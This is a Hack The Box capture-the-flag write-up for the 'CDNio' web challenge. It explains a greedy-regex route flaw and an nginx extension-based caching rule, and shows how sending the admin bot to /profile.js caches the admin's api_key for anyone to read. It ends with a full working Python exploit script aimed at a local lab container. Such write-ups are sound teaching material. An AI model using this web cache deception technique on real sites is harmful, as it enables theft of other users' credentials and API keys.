---
title: "HTB - CDNIO"
date: "2025-07-17"
draft: false
---
Type: #WEB #whitebox 
Difficulty: #easy 
SOLVED by: #myself 
TOOL USED: #burp #devtools 
TOPIC: #cache #docker

---

Writeup Date: 2025-01-30
URL = https://app.hackthebox.com/challenges/CDNio

---------

the challenge description 

> Race against time! Tweak CDN and caching magic to make web pages load at lightning speed. Minimize cache misses and watch your load times drop!

# LAB SETUP
the necessary files too play can be downloaded from official source [here](https://labs.hackthebox.com/api/v4/challenge/download/828) zip password: hackthebox

![[Pasted_image_20250203092102.png]](/screenshots/Pasted_image_20250203092102.png)
so using docker we can run it locally after the first run of `sudo  ./build_docker.sh` you dont to have run the `docker build --tag=web-cdnio .` again.

 you can just run `docker run -p <any port>:1337 --rm --name=web-cdnio -it web-cdnio` because the image was already built.

btw i used port 9001 but the original file was 1337:1337 it's just personal preference chose any port is available 
before visiting localhost:9001 and see what the app look like!
let's first see the **dockerfile**
## dockerfile
![[Pasted_image_20250203093358.png]](/screenshots/Pasted_image_20250203093358.png)well nothing fancy there just regular configuration. 
note: In a Dockerfile, the `ENTRYPOINT` command is used to specify the command that should be run when a container is started from the image. It defines the main executable for the container and can be used in combination with the `CMD` command to provide default arguments to that executable.

------

## entrypoint.sh
![[Pasted_image_20250204160141.png]](/screenshots/Pasted_image_20250204160141.png)
we an see that we will need to know api_key of user admin to get our flag

#### what the script doing
- Defines the path to the SQLite database.
- Checks if the database file does not exist; if so, it creates a new SQLite database.
- Creates a `users` table with specified fields and constraints in the database.
- Generates a random password using OpenSSL and exports it as an environment variable.
- Inserts a new user into the `users` table with a predefined username, random password, email, and API key.
- Creates necessary directories for Nginx cache and Gunicorn logs.
- Changes ownership of the log directory and the application directory to the 'nobody' user.
- Starts Nginx in the background with a command to run it in the foreground.
- Executes Gunicorn as the 'nobody' user, binding to a Unix socket and setting up workers and log file.

#### what is this challenge about
Actually we don't know yet but we can rule out what this box isn't and keep updating it 
- it's not gonna be about bruteforceing the admin's password because `openssl rand 16` is TRNG and not crackable in any shape or form
------

# Dynamic testing
IT is time to see our app while it's running let's visit localhost:9001 
![[Pasted_image_20250204161944.png]](/screenshots/Pasted_image_20250204161944.png)
OK, so we don't have a lot of things to do we have search function but first we have to register account 

### /register
![[Pasted_image_20250204162938.png]](/screenshots/Pasted_image_20250204162938.png)
so what's happing in the background is that we sending a POST request to /register endpoint with body being 
```json
{"username":"abc123","password":"123","email":"123"}
```
### search
![[Pasted_image_20250204171456.png]](/screenshots/Pasted_image_20250204171456.png)
![[Pasted_image_20250204171859.png]](/screenshots/Pasted_image_20250204171859.png)
![[Pasted_image_20250204171539.png]](/screenshots/Pasted_image_20250204171539.png)
![[Pasted_image_20250204171659.png]](/screenshots/Pasted_image_20250204171659.png)
![[Pasted_image_20250204171622.png]](/screenshots/Pasted_image_20250204171622.png)
If we have the password and username of a user, we can send a POST request to the / endpoint to obtain a JSON Web Token (JWT). With this token, we can then make a GET request to the /profile endpoint, providing the JWT in the headers. This will return a response containing our data, including the api_key (which is our goal).

A few ideas come to mind. One is that we could start by decoding the JWT and changing some values, or perhaps set the algorithm to NONE. Another possibility is to exploit SQL injection to dump the data. However, there is no need to explore these options further because we have the source code. If there is a weak secret or SQL injection vulnerability, we will be able to identify it.

### JWT
i dig for the JWT and i found in **config.py** this
![[Pasted_image_20250204173408.png]](/screenshots/Pasted_image_20250204173408.png)
no way we guessing the JWT secret key
![[Pasted_image_20250204173553.png]](/screenshots/Pasted_image_20250204173553.png)
so we are one idea less of when started
### SQL injection
i found in challenge/app/auth/routes.py
![[Pasted_image_20250204174039.png]](/screenshots/Pasted_image_20250204174039.png)
those lines of code highlighted the correct way to pass data to the database in python 

>The use of parameterized queries (the `?` placeholders in the SQL statement) helps prevent SQL injection attacks. When you pass the parameters as a tuple (in this case, `(username, password, email, api_key, datetime.datetime.utcnow())`), the database driver properly escapes and quotes these values, ensuring that they are treated as data and not executable SQL code.

and it's all over the application so let's say bye bye to our sqli dream

### middleware/auth.py
![[Pasted_image_20250209135556.png]](/screenshots/Pasted_image_20250209135556.png)

I notice that in a lot of the functionality of the app has the wrapper `@jwt_required`
so i had to understand what it does in order of avoiding unnecessary rabbit holes.
`@jwt_required` checks whether the user is authenticated. If not, it will return an error.

i tried to look for an any type of xss and the username is vulnerable to self xss but the question came to how would i save it some where and how would i make the admin user visit it 

### bot/routes.py
![[Pasted_image_20250209165643.png]](/screenshots/Pasted_image_20250209165643.png)
ok so we have hidden endpoint /visit that require us to be authenticated and providing json body 
```json
{"uri":"endpoint"}
```
will take the value of uri and pass it to bot thread

### utils/bot.py
![[Pasted_image_20250209170243.png]](/screenshots/Pasted_image_20250209170243.png)
1. **Login and Token Retrieval**: Inside `bot_thread(uri)`, the `bot_runner(uri)` function is called. This function invokes `login_and_get_token()`, which attempts to log in to the service at `http://0.0.0.0:1337` using the credentials for the admin user (username is "admin" and the password is retrieved from an environment variable called `RANDOM_PASSWORD`).
2. **Session Management**: A new session is created using `requests.Session()`, which allows for persistent connections and session-level configurations. The login request is sent as a POST request to the base URL.
3. **Authorization Header Setup**: If a token is successfully retrieved, it is used to create an authorization header that will be included in subsequent requests. The headers used for the GET request will now include the Bearer token for authentication.
4. **GET Request Execution**: A GET request is sent to the specified URI (given by the `uri` argument) on the base URL, using the session established earlier and the authorization header containing the token.

so we can make requests on the behalf of the admin user **NO SSRF TRICKS**. 
`{base}/{uri}` is protecting against SSRF PAYLOADS however if there is no forward slash, that's completely different scenario.

#### redirecting to /profile 
that will work but we can't see the response or CAN we ?
at this point i was giving up until i watched [nahmsec video](https://www.youtube.com/watch?v=fUhBiIpv61Y).
### conf/nginx.conf
![[Pasted_image_20250209174856.png]](/screenshots/Pasted_image_20250209174856.png)
 so nginx will cache and path that end in **a dot followed by \[one of extensions highlighted  \]** and cached i noticed it before but i thought it was an optimization for the challenge.
 but wait is this will just look for the resource and return 404 error ?
### main/routes.py 
![[Pasted_image_20250209180336.png]](/screenshots/Pasted_image_20250209180336.png)
in the regex there is a fault implementation `.*^profile` will match the following profile in a greedy way
`.` matches any character (except for line terminators)
`*` matches the previous token between zero and unlimited times, as many times as possible, giving back as needed (greedy)
`^` asserts position at start of a line 
![[Pasted_image_20250209180927.png]](/screenshots/Pasted_image_20250209180927.png)
the correct way is to remove the `*`
![[Pasted_image_20250209181018.png]](/screenshots/Pasted_image_20250209181018.png)
if we supplied /profile.js to /visit endpoint will match with /profile endpoint and complete the request and will be cached at /profile.js for 3 minutes.

### solve.py
![[Pasted_image_20250209182111.png]](/screenshots/Pasted_image_20250209182111.png)
1. Payload is the username and password we registered with
2. Send a POST request to get our JWT 
3. Send a GET request to /profile with our JWT in the headers **I was sending all the requests  to burp just to make sure everything goes as intended **
4. Four is just a POC of the the regex mistake (optional)
5. Now we sending the bot to /profile.js to make the request as the admin user
6. Now we visit the cached profile.js as non user and we found the admin api key (our flag)
![[Pasted_image_20250211225731.png]](/screenshots/Pasted_image_20250211225731.png)
You can login with the admin password in the web page and get  the flag from there too.
if you get errors like invalid token just keep sending  the request till a success occurs.

```python
#!/bin/env python3

import requests
import re

url = "http://localhost:9001"
proxies = {
    'http': '127.0.0.1:8080',
}

payload = {
    "username": "abc123",
    "password": "123",
}

respones = requests.post(url, json=payload)
if 'Credentials not found' in respones.json().get("message", ""):
    print("no account was found maybe you restarted the container?")
    print("making account with the following creds = abc123:123")
    requests.post(url + "/register", json={
        "username": "abc123",
        "password": "123",
        "email": "123", })
    respones = requests.post(url, json=payload)


user_token = respones.json()["token"]
print(user_token)

headers = {
    'Authorization': f'Bearer {user_token}',
    'Content-type': 'application/json'
}

my_profile = requests.get(url + "/profile", headers=headers)

print(my_profile.text)

subpath = 'profile.js'
if re.match(r'.*^profile', subpath):
    print(subpath)

else:
    print("not", subpath)

bot = requests.post(url + "/visit", headers=headers, json={"uri": "profile.js"})
print(bot.status_code, bot.text)

cached = requests.get(url + "/profile.js")
print(cached.text)

```

# reference
- nahamSec video [ These Vulnerabilities WILL Make you $100K in 2025 (Bug Bounty Tutorial](https://www.youtube.com/watch?v=fUhBiIpv61Y)
- Great talk by Martin Doyhenard | Security Researcher, PortSwigger [Gotta Cache Em All: Bending the Rules of Web Cache Exploitation](https://www.youtube.com/watch?v=9gvxEhugnVM)